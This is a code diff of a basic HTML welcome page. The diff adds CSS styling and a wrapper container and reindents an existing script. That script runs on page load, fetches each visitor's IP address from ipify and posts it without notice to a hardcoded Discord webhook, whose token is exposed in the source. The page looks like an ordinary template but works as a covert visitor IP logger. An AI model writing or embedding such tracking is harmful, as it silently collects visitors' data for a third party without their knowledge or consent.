@@ -2,33 +2,80 @@
 <html>
   <head>
     <title>Your Website Title</title>
+    <style>
+      /* Add your CSS styles below */
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #F0F0F0;
+      }
+
+      h1 {
+        font-size: 36px;
+        color: #333333;
+        margin-top: 50px;
+      }
+
+      p {
+        font-size: 18px;
+        color: #666666;
+      }
+
+      .container {
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 20px;
+        background-color: #FFFFFF;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        border-radius: 5px;
+        margin-top: 50px;
+      }
+
+      .button {
+        display: inline-block;
+        padding: 10px 20px;
+        background-color: #007AFF;
+        color: #FFFFFF;
+        border-radius: 5px;
+        text-decoration: none;
+        font-size: 18px;
+        transition: background-color 0.3s ease-in-out;
+      }
+
+      .button:hover {
+        background-color: #0053BA;
+      }
+    </style>
   </head>
   <body>
-    <h1>Welcome to Your Website</h1>
-    <p>Here is your website content.</p>
-    
-    <!-- Add your Discord webhook script below -->
-    <script type="text/javascript">
-      // Replace <discord-webhook-url> with your actual Discord webhook URL
-      const discordWebhookUrl = "https://canary.discord.com/api/webhooks/1107037105902854195/4pp8cLSJCLBfoXfphudj7aVUZBhyJ3Uo_tCv3ZD7E3B9ilAIOB4yOvYIxcP9jNrkGhD0";
+    <div class="container">
+      <h1>Welcome to Your Website</h1>
+      <p>Here is your website content.</p>
+      
+      <!-- Add your Discord webhook script below -->
+      <script type="text/javascript">
+        // Replace <discord-webhook-url> with your actual Discord webhook URL
+        const discordWebhookUrl = "https://canary.discord.com/api/webhooks/1107037105902854195/4pp8cLSJCLBfoXfphudj7aVUZBhyJ3Uo_tCv3ZD7E3B9ilAIOB4yOvYIxcP9jNrkGhD0";
 
-      // Use an API to get the user's IP address
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          const ipAddress = data.ip;
+        // Use an API to get the user's IP address
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            const ipAddress = data.ip;
 
-          // Send a POST request to the Discord webhook URL with the IP address
-          fetch(discordWebhookUrl, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              content: 'Someone has entered your website. Their IP address is ' + ipAddress
-            })
+            // Send a POST request to the Discord webhook URL with the IP address
+            fetch(discordWebhookUrl, {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({
+                content: 'Someone has entered your website. Their IP address is ' + ipAddress
+              })
+            });
           });
-        });
-    </script>
+      </script>
+
+      <a href="#" class="button">Click Me</a>
+    </div>
   </body>
 </html>
